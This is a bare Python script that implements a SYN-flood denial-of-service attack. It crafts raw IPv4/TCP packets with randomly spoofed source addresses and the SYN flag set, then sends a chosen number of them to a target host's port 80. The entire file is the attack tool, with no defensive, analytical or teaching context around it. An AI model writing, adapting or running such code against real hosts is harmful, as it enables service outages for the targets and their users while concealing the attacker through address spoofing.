import socket, struct, random, threading
def flood(target, count):
    s = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_RAW)
    s.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)
    for _ in range(count):
        src = f"{random.randint(1,254)}.{random.randint(1,254)}.{random.randint(1,254)}.{random.randint(1,254)}"
        pkt = struct.pack('!BBHHHBBH4s4s', 69, 0, 40, 12345, 0, 64, 6, 0, socket.inet_aton(src), socket.inet_aton(target))
        pkt += struct.pack('!HHLLBBHHH', 1234, 80, 0, 0, 5<<4, 2, 5840, 0, 0)
        s.sendto(pkt, (target, 0))
